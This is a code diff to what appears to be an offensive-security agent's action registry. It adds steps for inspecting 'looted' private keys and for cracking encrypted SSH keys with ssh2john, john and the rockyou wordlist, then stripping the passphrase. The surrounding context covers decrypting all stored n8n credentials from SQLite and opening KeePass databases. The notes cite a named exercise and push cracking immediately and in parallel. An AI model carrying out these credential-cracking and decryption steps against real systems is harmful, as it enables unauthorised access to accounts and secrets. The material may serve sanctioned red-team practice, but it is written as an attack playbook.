@@ -595,6 +595,22 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False,
         note="LLM06 blast radius: the recovered key decrypts every stored n8n credential. The "
              "REST API masks values (__n8n_BLANK_VALUE), so decrypt straight from SQLite."),
+    "inspect_private_key": _a("inspect_private_key",
+        ["head -5 $KEYFILE", "grep -aE 'ENCRYPTED|DEK-Info|BEGIN|bcrypt' $KEYFILE"],
+        note="Detect whether a looted key is encrypted (Proc-Type: 4,ENCRYPTED / DEK-Info, or an "
+             "OpenSSH bcrypt-KDF key). If so, crack it immediately (crack_encrypted_ssh_key)."),
+    "crack_encrypted_ssh_key": _a("crack_encrypted_ssh_key",
+        ["ssh2john $KEYFILE > key.hash",
+         "john --wordlist=/usr/share/wordlists/rockyou.txt key.hash",
+         "john --show key.hash",
+         "ssh-keygen -p -f $KEYFILE -P '<passphrase>' -N ''   # strip once cracked"],
+        risk="propose", runnable=False,
+        note="Rank this the moment ANY encrypted key is looted, in PARALLEL with any intel hunt — "
+             "do NOT assume a machine-generated passphrase is stored somewhere. THE TRAP: a second "
+             "john run prints 'No password hashes left to crack (see FAQ)' which reads like failure "
+             "but means it is ALREADY cracked — ALWAYS run `john --show`. (Synthetic Siege obj13: "
+             "the audit key was rockyou-crackable as `prometheus` from hour one; a misread early "
+             "run cost days chasing CredMan/KeePass/GitLab.)"),
     "keepass_kdbx_open": _a("keepass_kdbx_open",
         ["python3 -c \"from pykeepass import PyKeePass; "
          "kp=PyKeePass('$KDBX','$KDBX_MASTER'); "
